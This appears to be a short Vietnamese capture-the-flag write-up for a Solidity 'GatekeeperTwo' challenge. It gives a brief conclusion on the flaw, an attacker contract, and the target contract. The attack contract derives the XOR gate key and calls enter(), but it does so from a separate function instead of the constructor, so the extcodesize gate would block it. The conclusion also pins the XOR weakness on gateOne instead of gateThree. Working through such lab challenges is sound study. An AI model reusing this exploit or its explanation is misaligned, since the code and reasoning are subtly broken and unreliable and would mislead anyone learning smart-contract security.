### Kết luận
- Lỗ hổng: Sử dụng phép toán XOR là 1 phép toán có thể đảo ngược, `gateOne`  dễ dàng vượt qua bằng cách triển khai một hợp đồng khác để gọi hàm enter.
- Cách phòng tránh: Thay vì sử dụng extcodesize, bạn có thể thêm các điều kiện phức tạp khác, như kiểm tra ngữ cảnh giao dịch (block.number, block.timestamp, hoặc sử dụng Oracle), và tránh các phép toán có thể đảo ngược như XOR.
### Contract tấn công
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IGatekeeperTwo{
    function enter(bytes8 gateKey) external returns (bool);
}
contract GatekeeperTwoAttack{
    IGatekeeperTwo public victim;
    constructor(address challenge){
        victim = IGatekeeperTwo(challenge);
    }
    function attack() external{
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        victim.enter(key);
    }
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
